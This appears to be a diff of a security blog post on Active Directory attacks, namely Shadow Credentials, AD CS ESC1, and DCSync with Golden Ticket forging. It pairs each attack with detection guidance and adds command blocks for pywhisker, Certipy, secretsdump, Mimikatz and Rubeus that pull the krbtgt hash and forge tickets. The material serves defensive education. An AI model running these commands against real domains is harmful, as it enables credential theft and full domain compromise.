-  <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>The target's real password never changes, and never needs to. The forged key sits alongside it as a second, silent way in.</p>
+  <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>The forged key sits alongside the real password as a second, silent way in, and survives a legitimate password change untouched.</p>
 </div>
 
-Current tooling: `Whisker` (the original, C#, from Elad Shamir's research) or `pyWhisker` (its Python port, useful from non-domain-joined Linux hosts) to add the credential, and Certipy's `shadow auto` command, which adds the credential, authenticates, retrieves the resulting TGT and NT hash, and restores the original attribute value automatically in one step.
+```bash
+# pyWhisker, from a non-domain-joined Linux host: add the key, don't clean up
+pywhisker.py -d $DOMAIN -u $USER -p $PASSWORD --target $TARGET_USER --action add
+
+# Certipy: adds the credential, authenticates via PKINIT, retrieves the TGT
+# and NT hash, and restores the original attribute value automatically
+certipy shadow auto -u $USER@$DOMAIN -p $PASSWORD -account $TARGET_USER -dc-ip $DC_IP
+```
 
 **Detection.** Any write to `msDS-KeyCredentialLink` is inherently suspicious for an account that isn't enrolled in Windows Hello for Business, and shows up as **event 5136** with a SACL configured on the attribute. The authentication itself is a PKINIT-based AS-REQ, visible as **event 4768** with certificate-based pre-authentication indicated, which is rare enough in most environments that Microsoft Defender for Identity flags the volume and pattern directly.
 
@@ -176,69 +320,111 @@ Current tooling: `Whisker` (the original, C#, from Elad Shamir's research) or `p
 
 **ESC1** is the simplest and most common of them, and a good example of the whole category. A certificate template is vulnerable when three things are all true at once: it lets the requester supply their own Subject Alternative Name (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) rather than the CA filling it in from the requester's own AD identity, it includes the Client Authentication EKU (so the resulting certificate is valid for PKINIT), and enrollment rights on the template are granted broadly, often to `Domain Users` or `Authenticated Users`, because nobody expected the SAN field to matter.
 
+**Requirements:** enrollment rights on a template with all three properties above, which in practice means any authenticated domain user, since that's exactly who ESC1 templates tend to grant enrollment to.
+
 <div style={{ display: "flex", flexDirection: "column", alignItems: "center", margin: "2.5rem 0" }}>
-  <svg viewBox="0 0 640 150" style={{ width: "100%", maxWidth: "600px" }} role="img" aria-label="A four-step horizontal chain for AD CS ESC1: a vulnerable certificate template is found, allowing an attacker-supplied Subject Alternative Name with Client Authentication EKU and broad enrollment rights. The attacker requests a certificate with the Subject Alternative Name set to a privileged user's UPN. The certificate authority issues it exactly as requested. The attacker authenticates via PKINIT with that certificate and receives a TGT for the impersonated privileged account.">
-    <rect x="10" y="60" width="140" height="50" rx="7" fill="#f59e0b" fillOpacity="0.12" stroke="#f59e0b" strokeWidth="1.2" />
-    <text x="80" y="82" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">Vulnerable template</text>
-    <text x="80" y="95" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">found (Certipy find)</text>
-    <rect x="180" y="60" width="140" height="50" rx="7" fill="#f59e0b" fillOpacity="0.12" stroke="#f59e0b" strokeWidth="1.2" />
-    <text x="250" y="82" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">Request cert, SAN</text>
-    <text x="250" y="95" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">= target's UPN</text>
-    <rect x="350" y="60" width="140" height="50" rx="7" fill="#f59e0b" fillOpacity="0.12" stroke="#f59e0b" strokeWidth="1.2" />
-    <text x="420" y="82" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">CA issues it</text>
-    <text x="420" y="95" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">exactly as requested</text>
-    <rect x="520" y="60" width="110" height="50" rx="7" fill="#ef4444" fillOpacity="0.12" stroke="#ef4444" strokeWidth="1.3" />
-    <text x="575" y="82" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">PKINIT auth</text>
-    <text x="575" y="95" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">TGT as target</text>
-    <line x1="150" y1="85" x2="180" y2="85" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adEsc1)" />
-    <line x1="320" y1="85" x2="350" y2="85" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adEsc1)" />
-    <line x1="490" y1="85" x2="520" y2="85" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adEsc1)" />
+  <svg viewBox="0 0 640 210" style={{ width: "100%", maxWidth: "620px" }} role="img" aria-label="Two rows showing the two exchanges behind ESC1. First, the attacker sends a certificate signing request to the certificate authority, with the Subject Alternative Name set to a privileged target's UPN instead of its own identity, and the CA, following the vulnerable template's own rules, issues the certificate exactly as requested. Second, the attacker uses that certificate to authenticate via PKINIT, and the KDC returns a TGT for the impersonated privileged account.">
+    <text x="15" y="20" fill="currentColor" fontSize="10.5" fontWeight="bold" opacity="0.85">1. Enrollment: attacker requests a certificate from the CA</text>
+    <rect x="10" y="32" width="140" height="44" rx="7" fill="#f59e0b" fillOpacity="0.12" stroke="#f59e0b" strokeWidth="1.2" />
+    <text x="80" y="58" textAnchor="middle" fill="currentColor" fontSize="10" fontWeight="bold">Attacker</text>
+    <rect x="480" y="32" width="150" height="44" rx="7" fill="#f59e0b" fillOpacity="0.12" stroke="#f59e0b" strokeWidth="1.2" />
+    <text x="555" y="58" textAnchor="middle" fill="currentColor" fontSize="10" fontWeight="bold">Certificate Authority</text>
+    <line x1="150" y1="46" x2="480" y2="46" stroke="currentColor" strokeOpacity="0.55" strokeWidth="1.2" markerEnd="url(#adEsc1A)" />
+    <text x="315" y="39" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.7">CSR: SAN = target Domain Admin's UPN</text>
+    <line x1="480" y1="66" x2="150" y2="66" stroke="#f59e0b" strokeOpacity="0.8" strokeWidth="1.3" markerEnd="url(#adEsc1B)" />
+    <text x="315" y="83" textAnchor="middle" fill="#f59e0b" fontSize="8" opacity="0.9">certificate issued exactly as requested, no identity check</text>
+
+    <text x="15" y="118" fill="#ef4444" fontSize="10.5" fontWeight="bold" opacity="0.9">2. Authentication: attacker cashes the certificate in via PKINIT</text>
+    <rect x="10" y="130" width="140" height="44" rx="7" fill="#ef4444" fillOpacity="0.1" stroke="#ef4444" strokeWidth="1.2" />
+    <text x="80" y="156" textAnchor="middle" fill="currentColor" fontSize="10" fontWeight="bold">Attacker</text>
+    <rect x="480" y="130" width="150" height="44" rx="7" fill="#0ea5e9" fillOpacity="0.12" stroke="#0ea5e9" strokeWidth="1.2" />
+    <text x="555" y="156" textAnchor="middle" fill="currentColor" fontSize="10" fontWeight="bold">KDC</text>
+    <line x1="150" y1="144" x2="480" y2="144" stroke="#ef4444" strokeOpacity="0.75" strokeWidth="1.3" markerEnd="url(#adEsc1C)" />
+    <text x="315" y="137" textAnchor="middle" fill="#ef4444" fontSize="8" opacity="0.9">PKINIT AS-REQ, signed with the issued certificate</text>
+    <line x1="480" y1="164" x2="150" y2="164" stroke="#ef4444" strokeOpacity="0.75" strokeWidth="1.3" markerEnd="url(#adEsc1D)" />
+    <text x="315" y="182" textAnchor="middle" fill="#ef4444" fontSize="8" opacity="0.9">AS-REP: TGT for the impersonated Domain Admin</text>
     <defs>
-      <marker id="adEsc1" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
-        <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor" opacity="0.5" />
+      <marker id="adEsc1A" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor" opacity="0.55" />
+      </marker>
+      <marker id="adEsc1B" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="#f59e0b" opacity="0.85" />
+      </marker>
+      <marker id="adEsc1C" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="#ef4444" opacity="0.8" />
+      </marker>
+      <marker id="adEsc1D" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="#ef4444" opacity="0.8" />
       </marker>
     </defs>
   </svg>
-  <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>The CA isn't compromised and never misbehaves. It issues exactly the certificate the template said it could, which is precisely the problem.</p>
+  <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>The CA isn't compromised and never misbehaves in step one. It issues exactly the certificate the template said it could, which is precisely the problem, and step two just cashes that certificate in.</p>
 </div>
 
-Current tooling: `certipy find -u user -p pass -dc-ip <dc> -vulnerable` enumerates every template and flags exactly this combination of properties across the whole forest in one pass, and `certipy req` requests the certificate and performs the PKINIT authentication to hand back a usable TGT.
+```bash
+# enumerate every template in the forest and flag ESC1-vulnerable ones
+certipy find -u $USER@$DOMAIN -p $PASSWORD -dc-ip $DC_IP -vulnerable
+
+# request a certificate against the vulnerable template, SAN set to the target
+certipy req -u $USER@$DOMAIN -p $PASSWORD -ca $CA_NAME -template $TEMPLATE -upn administrator@$DOMAIN -dc-ip $DC_IP
+
+# authenticate with the issued certificate via PKINIT, retrieve the TGT and NT hash
+certipy auth -pfx administrator.pfx -dc-ip $DC_IP
+```
 
 **Detection.** The certificate authority's own event log (**events 4886 and 4887** on the CA server, tracking certificate requests and issuance) is the ground truth: a certificate request where the requesting principal and the Subject Alternative Name don't match, especially when the SAN belongs to a privileged account, is close to unambiguous. The proactive side matters just as much here: running `certipy find -vulnerable` against your own forest on a schedule is the AD CS equivalent of running BloodHound defensively, covered in Part 1's best practices, and catches the misconfiguration before anyone has to detect its abuse.
 
 ## DCSync and the Golden Ticket Endgame
 
-Domain controllers trust each other with a specific replication protocol, and any account holding the `Replicating Directory Changes` and `Replicating Directory Changes All` rights, ordinarily just Domain Admins, Enterprise Admins, and the DCs themselves, can ask a DC to replicate any object's data, including password hashes, as though the requester were another domain controller. This is <Term concept="dcsync">DCSync</Term>, and the object worth asking for is always the same one: `krbtgt`, whose password hash is what encrypts and signs every Kerberos ticket in the domain.
+Domain controllers trust each other with a specific replication protocol, `MS-DRSR`, running over RPC and generally referred to by its interface name, DRSUAPI. Any account holding the `Replicating Directory Changes` and `Replicating Directory Changes All` rights, ordinarily just Domain Admins, Enterprise Admins, and the DCs themselves, can bind to a DC over DRSUAPI and call `DRSGetNCChanges`, the exact RPC method real domain controllers call on each other to replicate, asking for any object's data, including password hashes, as though the requester were another domain controller. This is <Term concept="dcsync">DCSync</Term>, and the object worth asking for is always the same one: `krbtgt`, whose password hash is what encrypts and signs every Kerberos ticket in the domain.
+
+**Requirements:** `Replicating Directory Changes` and `Replicating Directory Changes All` extended rights on the domain naming context, which is where the entire chain of techniques above is usually aimed, since these rights are rarely granted directly and almost always reached by first escalating to an account, or a machine account's TGT, that already holds them.
 
 Once an attacker holds that hash, they can forge a <Term concept="golden-ticket">Golden Ticket</Term>: a Kerberos TGT built entirely offline, valid for any username and any group membership the attacker writes into it, including accounts that don't exist. Because it never touches a domain controller during creation, no authentication event marks the moment it's forged, only its later use.
 
 <div style={{ display: "flex", flexDirection: "column", alignItems: "center", margin: "2.5rem 0" }}>
-  <svg viewBox="0 0 640 150" style={{ width: "100%", maxWidth: "600px" }} role="img" aria-label="A four-step horizontal chain: an attacker holding Replicating Directory Changes rights runs DCSync to pull the krbtgt account's password hash from a domain controller, then forges a Golden Ticket entirely offline, then authenticates as any user with any group membership domain-wide until krbtgt's password is rotated." >
-    <rect x="10" y="60" width="140" height="50" rx="7" fill="#ef4444" fillOpacity="0.1" stroke="#ef4444" strokeWidth="1.2" />
-    <text x="80" y="82" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">Replicating Directory</text>
-    <text x="80" y="95" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">Changes rights</text>
-    <rect x="180" y="60" width="140" height="50" rx="7" fill="#ef4444" fillOpacity="0.1" stroke="#ef4444" strokeWidth="1.2" />
-    <text x="250" y="82" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">DCSync pulls</text>
-    <text x="250" y="95" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">krbtgt hash</text>
-    <rect x="350" y="60" width="140" height="50" rx="7" fill="#ef4444" fillOpacity="0.1" stroke="#ef4444" strokeWidth="1.2" />
-    <text x="420" y="82" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">Forge Golden Ticket</text>
-    <text x="420" y="95" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">entirely offline</text>
-    <rect x="520" y="60" width="110" height="50" rx="7" fill="#ef4444" fillOpacity="0.16" stroke="#ef4444" strokeWidth="1.4" />
-    <text x="575" y="82" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">Anyone,</text>
-    <text x="575" y="95" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">domain-wide</text>
-    <line x1="150" y1="85" x2="180" y2="85" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adDcsync)" />
-    <line x1="320" y1="85" x2="350" y2="85" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adDcsync)" />
-    <line x1="490" y1="85" x2="520" y2="85" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adDcsync)" />
+  <svg viewBox="0 0 640 180" style={{ width: "100%", maxWidth: "620px" }} role="img" aria-label="A diagram of the DCSync exchange followed by offline Golden Ticket forging. The attacker, holding Replicating Directory Changes rights, binds to a real domain controller over the DRSUAPI RPC interface and calls DRSGetNCChanges asking for the krbtgt account, the exact call real domain controllers use to replicate with each other. The domain controller, unable to distinguish this from a legitimate replication partner, returns the krbtgt password hash in its DRSGetNCChanges response. The attacker then forges a Golden Ticket entirely offline using that hash, valid for any username and group membership, with no further contact with any domain controller required to create it.">
+    <rect x="10" y="20" width="150" height="50" rx="7" fill="#ef4444" fillOpacity="0.1" stroke="#ef4444" strokeWidth="1.2" />
+    <text x="85" y="42" textAnchor="middle" fill="currentColor" fontSize="10" fontWeight="bold">Attacker</text>
+    <text x="85" y="55" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.7">Replicating Directory Changes</text>
+    <rect x="480" y="20" width="150" height="50" rx="7" fill="#0ea5e9" fillOpacity="0.12" stroke="#0ea5e9" strokeWidth="1.2" />
+    <text x="555" y="42" textAnchor="middle" fill="currentColor" fontSize="10" fontWeight="bold">Real DC</text>
+    <text x="555" y="55" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.7">treats attacker as a peer DC</text>
+    <line x1="160" y1="34" x2="480" y2="34" stroke="currentColor" strokeOpacity="0.55" strokeWidth="1.2" markerEnd="url(#adDcsyncA)" />
+    <text x="320" y="27" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.7">DRSUAPI bind + DRSGetNCChanges(krbtgt)</text>
+    <line x1="480" y1="58" x2="160" y2="58" stroke="#ef4444" strokeOpacity="0.75" strokeWidth="1.3" markerEnd="url(#adDcsyncB)" />
+    <text x="320" y="76" textAnchor="middle" fill="#ef4444" fontSize="8" opacity="0.9">DRSGetNCChanges response: krbtgt password hash</text>
+    <rect x="180" y="100" width="280" height="60" rx="7" fill="#ef4444" fillOpacity="0.1" stroke="#ef4444" strokeWidth="1.3" strokeDasharray="4 3" />
+    <text x="320" y="124" textAnchor="middle" fill="currentColor" fontSize="9.5" fontWeight="bold">Golden Ticket forged offline</text>
+    <text x="320" y="142" textAnchor="middle" fill="currentColor" fontSize="8.5" opacity="0.75">any username, any group, no DC contact needed</text>
+    <line x1="320" y1="70" x2="320" y2="100" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adDcsyncC)" />
     <defs>
-      <marker id="adDcsync" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+      <marker id="adDcsyncA" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor" opacity="0.55" />
+      </marker>
+      <marker id="adDcsyncB" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="#ef4444" opacity="0.85" />
+      </marker>
+      <marker id="adDcsyncC" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
         <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor" opacity="0.5" />
       </marker>
     </defs>
   </svg>
-  <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>Every other technique in this post is a way to reach this point. Once krbtgt is out, it stops mattering which account started the chain.</p>
+  <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>Every other technique in this post is a way to reach the rights this exchange requires. Once krbtgt is out, it stops mattering which account started the chain.</p>
 </div>
 
-Current tooling: Impacket's `secretsdump.py` (with `-just-dc` to run DCSync specifically) is the standard cross-platform way to pull the hash, and Rubeus's `golden` module, or Mimikatz's `kerberos::golden`, forges the ticket from it.
+```bash
+# Impacket, DCSync specifically, pulls krbtgt's hash over DRSUAPI
+secretsdump.py -just-dc-user krbtgt $DOMAIN/$USER:$PASSWORD@$DC_IP
+
+# Mimikatz, from a session with the same rights
+lsadump::dcsync /domain:$DOMAIN /user:krbtgt
+
+# forge the Golden Ticket entirely offline once the hash is in hand
+Rubeus.exe golden /rc4:$KRBTGT_HASH /domain:$DOMAIN /sid:$DOMAIN_SID /user:anyuser /ptt
+# or, with Mimikatz:
+kerberos::golden /user:anyuser /domain:$DOMAIN /sid:$DOMAIN_SID /krbtgt:$KRBTGT_HASH /ptt
+```
 
 **Detection.** DCSync itself is the more catchable half: a replication request (`DS-Replication-Get-Changes` or `DS-Replication-Get-Changes-All`, visible as **event 4662** with those specific GUIDs) originating from an IP address that isn't one of your domain controllers is a near-unambiguous signal, and it's exactly the kind of network-level pattern Microsoft Defender for Identity has a dedicated DCSync alert for, since it watches the replication traffic directly rather than depending on this auditing being configured. A Golden Ticket's actual use is far harder to catch after the fact, since it looks like valid Kerberos traffic from a domain perspective; the reliable mitigations are the two most-cited ones for a reason, rotating the krbtgt password twice (a single rotation leaves the previous hash valid) after any suspected DCSync, and limiting who holds replication rights in the first place, which is an ACL review question straight out of Part 1's best practices section.
 
@@ -287,3 +473,9 @@ Nothing in this post exploited a vulnerability in the CVE sense. Kerberoasting a
 	The full protocol-level Kerberoasting walkthrough this post links out to rather than repeating.
 12. ShutdownRepo, targetedKerberoast. [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
 	The tool referenced in the Targeted Kerberoasting addition, automating the write, roast, and cleanup of a temporary SPN.
+13. Lionel Gilles (topotam), PetitPotam. [https://github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam)
+	The MS-EFSRPC coercion tool referenced in the unconstrained delegation section's exchange diagram.
+14. Fortra, Impacket. [https://github.com/fortra/impacket](https://github.com/fortra/impacket)
+	The source of `GetUserSPNs.py`, `GetNPUsers.py`, `addcomputer.py`, `rbcd.py`, `getST.py`, and `secretsdump.py`, referenced throughout this post's command blocks.
+15. The Hacker Recipes, "Active Directory." [https://www.thehacker.recipes/ad/](https://www.thehacker.recipes/ad/)
+	A command-level reference for these and other AD attack techniques, used as a structural model for the requirements lines and command blocks added throughout this post.
